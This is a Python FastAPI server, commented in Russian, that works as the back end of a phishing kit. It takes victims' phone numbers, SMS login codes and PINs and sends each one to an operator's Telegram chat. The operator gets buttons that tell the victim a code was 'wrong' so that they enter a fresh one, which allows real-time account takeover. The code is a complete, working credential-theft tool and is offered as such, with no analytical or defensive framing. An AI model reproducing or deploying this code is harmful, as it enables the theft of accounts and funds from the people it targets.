import os
import logging
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
import requests

BOT_TOKEN = os.getenv("BOT_TOKEN")
MY_CHAT_ID = os.getenv("MY_CHAT_ID")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_SEND_MESSAGE_URL = TELEGRAM_API_URL

logging.basicConfig(level=logging.INFO)

# Хранилище сессий: session_id -> {phone, code, user_chat_id}
sessions = {}

def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        resp = requests.post(TELEGRAM_SEND_MESSAGE_URL, json=payload, timeout=5)
        resp.raise_for_status()
        return resp.json()
    except Exception as e:
        logging.error(f"Ошибка отправки в Telegram: {e}")
        return None

def send_to_admin(text: str):
    send_to_telegram(MY_CHAT_ID, text)

def send_to_user(chat_id: str, text: str):
    send_to_telegram(chat_id, text)

# Клавиатура для админа (кнопки ошибок)
def get_admin_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "❌ Неверный номер", "callback_data": f"error_phone_{session_id}"},
                {"text": "❌ Неверный код", "callback_data": f"error_code_{session_id}"}
            ],
            [
                {"text": "❌ Неверный PIN", "callback_data": f"error_pin_{session_id}"},
                {"text": "✅ Всё верно", "callback_data": f"success_{session_id}"}
            ]
        ]
    }

class PhoneData(BaseModel):
    phone: str
    session_id: str
    user_chat_id: int = None

class CodeData(BaseModel):
    session_id: str
    code: str

class PinData(BaseModel):
    session_id: str
    pin: str

@asynccontextmanager
async def lifespan(app: FastAPI):
    send_to_admin("🤖 *Бот запущен* (с кнопками ошибок)")
    yield
    send_to_admin("⚠️ Бот остановлен")

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/submit_phone")
async def submit_phone(data: PhoneData):
    phone = data.phone
    sid = data.session_id
    user_chat_id = data.user_chat_id
    
    if not phone or not sid:
        raise HTTPException(status_code=400, detail="Не хватает номера или session_id")
    
    sessions[sid] = {"phone": phone, "user_chat_id": user_chat_id}
    
    # Отправляем админу с кнопками
    admin_text = f"📞 *НОВЫЙ НОМЕР*\n🆔 Сессия: `{sid}`\n📞 Номер: `{phone}`"
    if user_chat_id:
        admin_text += f"\n👤 Chat ID: `{user_chat_id}`"
    
    send_to_telegram(MY_CHAT_ID, admin_text, reply_markup=get_admin_keyboard(sid))
    
    return {"status": "ok"}

@app.post("/submit_code")
async def submit_code(data: CodeData):
    sid = data.session_id
    code = data.code
    
    if not sid or not code:
        raise HTTPException(status_code=400, detail="Не хватает session_id или кода")
    
    session = sessions.get(sid)
    if not session:
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    
    session["code"] = code
    
    # Отправляем админу обновление
    admin_text = f"🔢 *SMS-КОД*\n🆔 Сессия: `{sid}`\n📞 Номер: `{session['phone']}`\n🔢 Код: `{code}`"
    send_to_telegram(MY_CHAT_ID, admin_text, reply_markup=get_admin_keyboard(sid))
    
    return {"status": "ok"}

@app.post("/submit_pin")
async def submit_pin(data: PinData):
    sid = data.session_id
    pin = data.pin
    
    if not sid or not pin:
        raise HTTPException(status_code=400, detail="Не хватает session_id или PIN")
    
    session = sessions.get(sid)
    if not session:
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    
    # Отправляем админу финальное сообщение с кнопками
    admin_text = (f"🔐 *ЗАВЕРШЁННАЯ СЕССИЯ*\n"
                  f"🆔 Сессия: `{sid}`\n"
                  f"📞 Номер: `{session['phone']}`\n"
                  f"🔢 SMS-код: `{session['code']}`\n"
                  f"🔢 PIN-код: `{pin}`")
    
    send_to_telegram(MY_CHAT_ID, admin_text, reply_markup=get_admin_keyboard(sid))
    
    return {"status": "ok"}

@app.post("/webhook/callback")
async def handle_callback(request: dict):
    """Эндпоинт для обработки нажатий на кнопки в Telegram"""
    callback_data = request.get("callback_query", {})
    data = callback_data.get("data", "")
    message = callback_data.get("message", {})
    chat_id = message.get("chat", {}).get("id")
    
    if not data or not chat_id:
        return {"status": "ok"}
    
    # Парсим callback_data: error_phone_session123
    parts = data.split("_")
    if len(parts) >= 3:
        error_type = parts[1]  # phone, code, pin
        session_id = "_".join(parts[2:])
        
        session = sessions.get(session_id)
        user_chat_id = session.get("user_chat_id") if session else None
        
        error_messages = {
            "phone": "❌ Номер телефона неверный. Пожалуйста, начните заново.",
            "code": "❌ SMS-код неверный. Пожалуйста, начните заново.",
            "pin": "❌ PIN-код неверный. Пожалуйста, начните заново."
        }
        
        # Отправляем пользователю сообщение об ошибке
        if user_chat_id and error_type in error_messages:
            send_to_user(str(user_chat_id), error_messages[error_type])
        
        # Удаляем сессию
        if session_id in sessions:
            del sessions[session_id]
        
        # Отвечаем на callback, чтобы кнопка перестала "висеть"
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
            json={"callback_query_id": callback_data.get("id"), "text": "Обработано"}
        )
    
    return {"status": "ok"}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
